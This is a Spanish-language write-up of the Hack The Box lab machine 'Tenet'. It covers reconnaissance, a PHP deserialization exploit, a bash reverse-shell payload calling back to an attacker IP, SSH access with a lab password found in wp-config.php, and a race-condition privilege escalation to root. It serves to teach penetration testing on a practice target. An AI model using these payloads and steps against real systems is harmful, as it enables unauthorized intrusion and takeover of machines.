---
layout: single
title: Tenet - Hack The Box
excerpt: "Resolución de la máquina *Tenet* de Hack The Box, una máquina Linux de dificultad media según la plataforma en la cual nos aprovechamos de la vulnerabilidad *PHP Object  Deserialization* para obtener el acceso inicial, para posteriormente encontrar la contraseña del usuario *neil* y acceder por ssh a la máquina, y finalmente provocar una *race condition* para obtener el acceso de root."
date: 2021-06-13
classes: wide
header:
  teaser: /assets/images/Tenet-Hackthebox/tenet.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - Web Exploiting
  - Privilege Escalation
  - Pentesting
  - Linux
---

![](/assets/images/Tenet-Hackthebox/tenet.png)

Resolución de la máquina *Tenet* de Hack The Box, una máquina Linux de dificultad media según la plataforma en la cual nos aprovechamos de la vulnerabilidad *PHP Object  Deserialization* para obtener el acceso inicial, para posteriormente encontrar la contraseña del usuario *neil* y acceder por ssh a la máquina, y finalmente provocar una *race condition* para obtener el acceso de root.

## Escaneo con nmap

```bash
❯ nmap -sC -sV -p22,80 10.10.10.223 -oN targeted                                                                                                                                                                ─╯
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-30 19:47 CEST
Nmap scan report for 10.10.10.223
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.40 seconds
```

Puertos abiertos 22(SSH) y 80(HTTP)

El puerto 80 muestra la página por defecto de Apache.

![](/assets/images/Tenet-Hackthebox/web.png)

Hago fuzzing con gobuster y veo un directorio wordpress

```bash
❯ gobuster dir -u http://10.10.10.223 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 40 -o gobuster-root.log                                                                                    ─╯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.223
[+] Threads:        40
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/30 19:54:14 Starting gobuster
===============================================================
/.php (Status: 403)
/.htm (Status: 403)
/.html (Status: 403)
/. (Status: 200)
/wordpress (Status: 301)
```

Accedo pero no se muestra bien la página.

![](/assets/images/Tenet-Hackthebox/wp1.png)

Viendo el código fuente veo que tira del dominio tenet.htb, así que lo añado a mi fichero hosts y ya carga bien.

![](/assets/images/Tenet-Hackthebox/wp3.png)

En el post **Migration** hay un comentario que dice:

```
did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```

Hago fuzzing con gobuster pero no encuentro nada interesante, con lo cual decido probar la palabra sator como un subdominio.

Añado sator.tenet.htb al fichero hosts y accedo a la página. Obtengo una página por defecto de Apache. Añado a la URL sator.php y veo que existe.

![](/assets/images/Tenet-Hackthebox/sator.png)

Leyendo el comentario anterior del usuario Neil veo que habla de un backup, así que pruebo con sator.php.bak y me descargo el archivo.

http://sator.tenet.htb/sator.php.bak

```php
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

Analizando el código vemos que usa la función **GET** con la variable **arepo** y la deserializa, con lo cual intuyo que el vector de ataque puede ser **PHP Object  Deserialization**.

El script tiene una clase llamada **DatabaseExport** que utiliza la función **file_put_contents** para escribir el valor de la variable **data** en el fichero previamente definido en **user_file** y luego lo copia al directorio /.


Además al acceder a users.txt devuelve **Succes**.


Encuentro una página donde explican como explotar la vulnerabilidad:
https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a

Me creo un fichero con el siguiente contenido:

```php
<?php
class DatabaseExport {
  public $user_file = 'shell.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.49/443 0>&1\'"); ?>';
  }

print urlencode(serialize(new DatabaseExport));
?>
```

El script definirá un fichero shell.php y escribirá el contenido de data en él. Después al ejecutarlo con php -f mostrará el contenido deserializado en formato urlencode.

```bash
❯ php -f payload.php;echo                                                                                                                                                                                       ─╯
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.49%2F443+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

![](/assets/images/Tenet-Hackthebox/ppayload.png)

Con curl le paso la salida del comando anterior a la variable arepo, y al acceder al fichero shell.php obtengo la reverse shell.

```bash
curl -i http://sator.tenet.htb/sator.php\?arepo\=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.49%2F443+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

![](/assets/images/Tenet-Hackthebox/shell.png)

## Escalada al usuario Neil
--------------

Convierto la shell en totalmente interactiva.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
export TERM=xterm
export SHELL=bash
stty rows 58 columns 213
```

Miro dentro del directorio wordpress y en el fichero wp-config.php encuentro las credenciales del usuario neil

neil:Opera2112

![](/assets/images/Tenet-Hackthebox/config.png)

Pruebo si ha reutilizado la contraseña por ssh y accedo.

![](/assets/images/Tenet-Hackthebox/ssh.png)

## Escalada a root

Ejecuto **sudo -l** y veo que puedo ejecutar el script **/usr/local/bin/enableSSH.sh** como root sin proporcionar contraseña.

El contenido del script es el siguiente:

```bash
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

Crea un archivo en /tmp con nombre aleatorio ssh-XXXXXXXX, escribe en el archivo una clave pública ssh y la añade al /root/.ssh/authorized_keys

Por un lado ejecuto 
```bash
while true; do echo "mi clave pública" | tee /tmp/ssh* > /dev/null; done
```

Y por otro lado desde otra conexión por ssh con el usuario neil ejecuto:

```bash
while true; do sudo /usr/local/bin/enableSSH.sh; done
```

Al mismo tiempo intento conectarme por ssh con el usuario root y consigo que se conecte sin pedir contraseña porque se ha añadido mi clave al authorized_keys de root.